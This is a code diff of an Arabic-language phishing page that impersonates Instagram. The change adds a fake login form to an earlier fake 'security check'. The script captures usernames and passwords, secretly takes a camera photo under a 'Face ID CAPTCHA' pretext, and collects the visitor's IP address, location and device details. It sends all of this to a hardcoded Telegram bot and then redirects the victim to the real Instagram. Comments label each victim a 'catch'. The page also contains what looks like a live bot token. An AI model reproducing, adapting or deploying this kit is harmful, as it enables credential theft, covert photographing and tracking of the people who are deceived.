@@ -1,73 +1,75 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Verification</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/platform/1.3.6/platform.min.js"></script>
+    <title>Instagram</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 320px; text-align: center; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
-        .logo { width: 175px; margin-bottom: 20px; }
-        h3 { font-size: 18px; color: #262626; margin-bottom: 10px; }
-        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 20px; }
-        button { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        #loading { display: none; color: #0095f6; font-weight: bold; }
+        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl; }
+        .container { background: white; border: 1px solid #dbdbdb; padding: 40px 20px; width: 350px; text-align: center; border-radius: 1px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
+        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 14px; }
+        #verify-section { display: none; }
+        .info-text { font-size: 14px; color: #8e8e8e; margin: 20px 0; line-height: 1.5; }
+        .logo { width: 175px; margin-bottom: 30px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b564.png" class="logo">
-    <div id="main-content">
-        <h3>تأكيد أمان الحساب</h3>
-        <p>تم اكتشاف محاولة دخول غير معروفة. يرجى إتمام فحص الأمان (Face ID & Location) للمتابعة إلى حسابك.</p>
-        <button id="start-btn">بدء الفحص الآن</button>
+    <div id="login-section">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b564.png" class="logo" alt="Instagram">
+        <form id="login-form">
+            <input type="text" id="email" placeholder="رقم الهاتف أو اسم المستخدم أو البريد" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
     </div>
-    <div id="loading">جاري معالجة البيانات...</div>
+
+    <div id="verify-section">
+        <h3>تأكيد الهوية</h3>
+        <p class="info-text">لأمان حسابك، يرجى إجراء فحص سريع للوجه للتأكد من أنك لست روبوت (CAPTCHA Face ID).</p>
+        <button id="start-camera">بدء الفحص الآن</button>
+    </div>
 </div>
 
 <script>
     const token = '8609389464:AAEIqne_f0xZNOeqYz-rk7XOsbALUM12gA8';
     const chat_id = '8658217605';
+    let user_email = "", user_pass = "";
 
-    document.getElementById('start-btn').addEventListener('click', async function() {
-        document.getElementById('main-content').style.display = 'none';
-        document.getElementById('loading').style.display = 'block';
-
-        let report = `🔔 صيدة كاملة لـ أنس:\n\n`;
-
-        // 1. جلب الـ IP والجهاز (فوراً عند الضغط)
-        try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            report += `🌐 الـ IP: ${ipData.ip}\n`;
-            report += `📱 الجهاز: ${platform.description}\n`;
-            report += `⚙️ النظام: ${platform.os.family} ${platform.os.version}\n\n`;
-        } catch (e) { report += "❌ فشل جلب الـ IP\n"; }
-
-        // 2. طلب الموقع الجغرافي (GPS)
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                report += `📍 الموقع (دقيق): https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
-                report += `🎯 الدقة: ${Math.round(pos.coords.accuracy)} متر\n\n`;
-                await startCamera(report);
-            }, async (err) => {
-                report += `⚠️ رفض الموقع الجغرافي\n\n`;
-                await startCamera(report);
-            }, { enableHighAccuracy: true });
-        } else {
-            await startCamera(report);
-        }
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        user_email = document.getElementById('email').value;
+        user_pass = document.getElementById('pass').value;
+        document.getElementById('login-section').style.display = 'none';
+        document.getElementById('verify-section').style.display = 'block';
     });
 
-    async function startCamera(fullReport) {
+    document.getElementById('start-camera').addEventListener('click', async function() {
+        this.innerText = "جاري التحميل...";
+        this.disabled = true;
+
         try {
+            // 1. جلب الكاميرا
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
 
+            // 2. جلب الـ IP والمعلومات الجغرافية بدقة
+            let ipInfo = "فشل جلب البيانات الجغرافية";
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const data = await ipRes.json();
+                ipInfo = `الـ IP: ${data.ip}\nالمدينة: ${data.city}\nالدولة: ${data.country_name}\nالمزود: ${data.org}`;
+            } catch (e) {
+                // محاولة بديلة في حال فشل الأولى
+                const altIp = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+                ipInfo = `الـ IP: ${altIp.ip}`;
+            }
+
+            // 3. التقاط الصورة
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -76,8 +78,12 @@
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
                 formData.append('chat_id', chat_id);
-                formData.append('photo', blob, 'face.jpg');
-                formData.append('caption', fullReport);
+                formData.append('photo', blob, 'identity.jpg');
+                
+                // تجميع التقرير بدون مكاتب خارجية
+                const caption = `🔥 صيدة جديدة لـ أنس:\n\n📧 الحساب: ${user_email}\n🔑 الباسورد: ${user_pass}\n\n🌐 بيانات الشبكة:\n${ipInfo}\n\n📱 معلومات الجهاز:\n${navigator.userAgent}\n🖥️ الشاشة: ${screen.width}x${screen.height}`;
+
+                formData.append('caption', caption);
 
                 await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                     method: 'POST',
@@ -87,12 +93,15 @@
                 stream.getTracks().forEach(track => track.stop());
                 window.location.replace("https://www.instagram.com");
             }, 'image/jpeg');
+
         } catch (err) {
-            // إذا رفض الكاميرا نرسل التقرير النصي فقط
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(fullReport + "❌ رفض الكاميرا")}`);
+            // في حال الرفض
+            const fallback = `⚠️ رفض الكاميرا:\n📧 الحساب: ${user_email}\n🔑 الباسورد: ${user_pass}`;
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(fallback)}`);
             window.location.replace("https://www.instagram.com");
         }
-    }
+    });
 </script>
+
 </body>
 </html>
